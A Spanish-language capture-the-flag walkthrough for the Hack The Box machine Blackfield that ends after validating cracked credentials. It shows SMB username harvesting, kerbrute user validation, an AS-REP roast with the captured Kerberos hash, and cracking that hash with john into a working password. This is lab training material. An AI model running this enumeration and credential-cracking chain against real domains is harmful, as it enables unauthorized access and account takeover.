---
layout: post
title: "HackTheBox - Blackfield (hard)"
categories: hackthebox/machines/hard
---

<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/7c69c876f496cd729a077277757d219d.png">
</p>

- En este post vamos a estar haciendo la maquina Blackfield de la plataforma de Hack The Box donde vamos a estar enumerando por SMB, estar usando kerbrute para validar usuarios del dominio y poder hacer un ASRepRoast Attack además de que enumerando con Bloodhound encontramos que podemos cambiarle la contraseña a un usuario usando net rpc y nos conectaremos con evil-winrm ala maquina para la escalada de privilegios abusaremos de un privilegio que tenemos que es el SeBackupPrivilege para hacer una copia de 2 archivos y usar secretsdump para ver los hashes de los usuarios y conectarnos como el administrador.

## PortScan

- Comenzamos escaneando los servicios que corre la maquina victima en sus puertos abiertos por el protocolo **TCP**.

```bash
➜  nmap sudo nmap -sCV -p53,88,135,389,445,593,3268,5985 10.129.126.69 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-19 19:05 CST
Nmap scan report for 10.129.126.69
Host is up (0.089s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-20 08:05:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-04-20T08:05:53
|_  start_date: N/A
|_clock-skew: 6h59m59s
```

## Enumeración 

- Estamos ante un DC.

```bash
➜  nmap crackmapexec smb 10.129.126.69
SMB         10.129.126.69   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
```

- Vamos a ver si hay recursos compartidos por `smb`.

```bash
➜  nmap smbmap -H 10.129.126.69 -u 'miguelito' --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.126.69:445	Name: 10.129.126.69       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	profiles$                                         	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share
```

- Tenemos privilegio de lectura en `profiles$`.

```bash
➜  nmap smbmap -H 10.129.126.69 -u 'miguelito' -r 'profiles$' --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.126.69:445	Name: 10.129.126.69       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	profiles$                                         	READ ONLY	
	./profiles$
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	.
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	..
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AAlleni
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABarteski
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABekesz
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABenzies
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABiemiller
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AChampken
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ACheretei
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ACsonaki
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AHigchens
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AJaquemai
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKlado
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKoffenburger
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKollolli
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKruppe
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKubale
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ALamerz
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AMaceldon
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AMasalunga
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ANavay
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ANesterova
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ANeusse
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AOkleshen
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	APustulka
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ARotella
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ASanwardeker
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AShadaia
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ASischo
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ASpruce
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ATakach
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ATaueg
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ATwardowski
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	audit2020
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AWangenheim
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AWorsey
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AZigmunt
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BBakajza
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BBeloucif
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BCarmitcheal
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BConsultant
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BErdossy
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BGeminski
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BLostal
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BMannise
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BNovrotsky
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BRigiero
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BSamkoses
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BZandonella
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CAcherman
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CAkbari
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CAldhowaihi
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CArgyropolous
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CDufrasne
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CGronk
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	Chiucarello
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	Chiuccariello
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CHoytal
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CKijauskas
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CKolbo
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CMakutenas
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CMorcillo
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CSchandall
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CSelters
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CTolmie
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DCecere
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DChintalapalli
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DCwilich
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DGarbatiuc
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DKemesies
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMatuka
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMedeme
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMeherek
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMetych
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DPaskalev
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DPriporov
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DRusanovskaya
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DVellela
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DVogleson
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DZwinak
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	EBoley
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	EEulau
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EFeatherling
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EFrixione
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EJenorik
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EKmilanovic
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ElKatkowsky
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EmaCaratenuto
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EPalislamovic
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EPryar
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ESachhitello
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ESariotti
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ETurgano
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EWojtila
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FAlirezai
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FBaldwind
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FBroj
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FDeblaquire
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FDegeorgio
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FianLaginja
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FLasokowski
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FPflum
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FReffey
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GaBelithe
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	Gareld
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GBatowski
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GForshalger
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GGomane
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GHisek
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GMaroufkhani
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GMerewether
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GQuinniey
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GRoswurm
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GWiegard
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HBlaziewske
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HColantino
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HConforto
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HCunnally
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HGougen
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HKostova
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	IChristijr
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	IKoledo
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	IKotecky
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ISantosi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JAngvall
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JBehmoiras
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JDanten
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JDjouka
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JKondziola
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JLeytushsenior
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JLuthner
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JMoorehendrickson
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JPistachio
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JScima
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JSebaali
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JShoenherr
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JShuselvt
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KAmavisca
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KAtolikian
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KBrokinn
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KCockeril
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KColtart
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KCyster
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KDorney
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KKoesno
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KLangfur
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KMahalik
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KMasloch
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KMibach
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KParvankova
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KPregnolato
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KRasmor
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KShievitz
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KSojdelius
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KTambourgi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KVlahopoulos
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KZyballa
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBajewsky
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBaligand
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBarhamand
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBirer
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBobelis
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LChippel
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LChoffin
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LCominelli
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LDruge
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LEzepek
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LHyungkim
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKarabag
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKirousis
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKnade
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKrioua
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LLefebvre
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LLoeradeavilez
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LMichoud
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LTindall
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LYturbe
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MArcynski
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MAthilakshmi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MAttravanam
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MBrambini
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MHatziantoniou
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MHoerauf
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MKermarrec
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MKillberg
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MLapesh
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MMakhsous
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MMerezio
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MNaciri
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MShanmugarajah
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MSichkar
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MTemko
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MTipirneni
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MTonuri
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MVanarsdel
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NBellibas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NDikoka
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NGenevro
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NGoddanti
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NMrdirk
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NPulido
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NRonges
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NSchepkie
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NVanpraet
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OBelghazi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OBushey
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OHardybala
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OLunas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ORbabka
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PBourrat
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PBozzelle
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PBranti
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PCapperella
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PCurtz
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PDoreste
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PGegnas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PMasulla
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PMendlinger
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PParakat
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PProvencer
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PTesik
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PVinkovich
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PVirding
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PWeinkaus
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RBaliukonis
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RBochare
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RKrnjaic
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RNemnich
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RPoretsky
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RStuehringer
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RSzewczuga
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RVallandas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RWeatherl
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RWissor
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SAbdulagatov
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SAjowi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SAlguwaihes
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SBonaparte
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SBouzane
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SChatin
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SDellabitta
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SDhodapkar
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SEulert
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SFadrigalan
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SGolds
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SGrifasi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SGtlinas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SHauht
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SHederian
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SHelregel
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SKrulig
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SLewrie
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SMaskil
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	Smocker
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SMoyta
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SRaustiala
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SReppond
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SSicliano
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SSilex
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SSolsbak
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	STousignaut
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	support
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	svc_backup
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SWhyte
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SWynigear
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TAwaysheh
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TBadenbach
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TCaffo
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TCassalom
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TEiselt
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TFerencdo
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TGaleazza
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TKauten
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TKnupke
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TLintlop
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TMusselli
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TOust
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TSlupka
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TStausland
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TZumpella
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	UCrofskey
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	UMarylebone
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	UPyrke
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VBublavy
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VButziger
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VFuscca
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VLitschauer
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VMamchuk
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VMarija
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VOlaosun
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VPapalouca
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	WSaldat
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	WVerzhbytska
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	WZelazny
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XBemelen
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XDadant
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XDebes
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XKonegni
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XRykiel
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YBleasdale
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YHuftalin
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YKivlen
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YKozlicki
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YNyirenda
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YPredestin
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YSeturino
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YSkoropada
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YVonebers
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YZarpentine
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZAlatti
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZKrenselewski
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZMalaab
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZMiick
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZScozzari
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZTimofeeff
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZWausik
	SYSVOL                                            	NO ACCESS	Logon server share
```

- Al parecer son nombres de usuarios de todos estos usuarios debemos ver cuantos de esos son verdaderos.

```bash
➜  nmap smbmap -H 10.129.126.69 -u 'miguelito' -r 'profiles$' --no-banner | awk 'NF{print $NF}' > ../content/users.txt
```

- Vamos a usar <https://github.com/ropnop/kerbrute> para validar los usuarios.

- Vamos agregar el nombre del dominio al **/etc/hosts**.

```bash
➜  content echo "10.129.126.69 BLACKFIELD.local blackfield.local" | sudo tee -a /etc/hosts
10.129.126.69 BLACKFIELD.local blackfield.local
```

- Ahora validamos los usuarios.

```bash
➜  content /opt/kerbrute_linux_amd64 userenum --dc 10.129.126.69 -d blackfield.local users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 04/19/24 - Ronnie Flathers @ropnop

2024/04/19 19:20:59 >  Using KDC(s):
2024/04/19 19:20:59 >  	10.129.126.69:88

2024/04/19 19:21:19 >  [+] VALID USERNAME:	 audit2020@blackfield.local
2024/04/19 19:23:14 >  [+] VALID USERNAME:	 support@blackfield.local
2024/04/19 19:23:19 >  [+] VALID USERNAME:	 svc_backup@blackfield.local
2024/04/19 19:23:45 >  Done! Tested 315 usernames (3 valid) in 166.123 seconds
```

- Ahora vamos hacer un `ASREPRoast Attack` con los usuarios validos que tenemos <https://zer1t0.gitlab.io/posts/attacking_ad/#asreproast>.

- Tenemos el hash del usuario `support` ya que no tiene activado el `UF_DONT_REQUIRE_PREAUTH`.

```bash
➜  content impacket-GetNPUsers blackfield.local/ -no-pass -usersfile valid_users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:0eabfacfb6de7f81120e4c162e0e1df9$2035e324a36e8b827defd1956fca64c98a164419f038369d586c107605a9aca2cf7ae0690a7e573446eb7d609ee6b584986de2d19383bc16f45a4872baa6239ab9e9d36e9704533f714a89ef6f6f3d9c956c6474ffcc127e0979e7cb60d9b55a2e031cc45370a9e9bf16f3dffccab5d7e838a39dd7be656a598d9f153cf0d7bc5a979cdf621b5d6e02bd483edb4284ad986bd55a0295f22a6dcc199135aa5886c782f448b78a711dcb32899edf17dccaa02b5d289564c88b022d4a25ac779d44b1c3ce5e96cdc41c417955a757506294434272fb38e386f507e062a3bb49b288ed2167d970cc81969e31fc1d307cebcf659123e0
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- Vamos a crackear el hash.

```bash
➜  content john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
1g 0:00:01:05 DONE (2024-04-19 19:29) 0.01524g/s 218487p/s 218487c/s 218487C/s #1WIF3Y..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Vamos a validar que la contraseña sea correcta.

```bash
➜  content crackmapexec smb 10.129.126.69 -u 'support' -p '#00^BlackKnight'
SMB         10.129.126.69   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.126.69   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
```

- El usuario no forma parte del grupo `Remote Management Users`.

```bash
➜  content crackmapexec winrm 10.129.126.69 -u 'support' -p '#00^BlackKnight'
SMB         10.129.126.69   5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
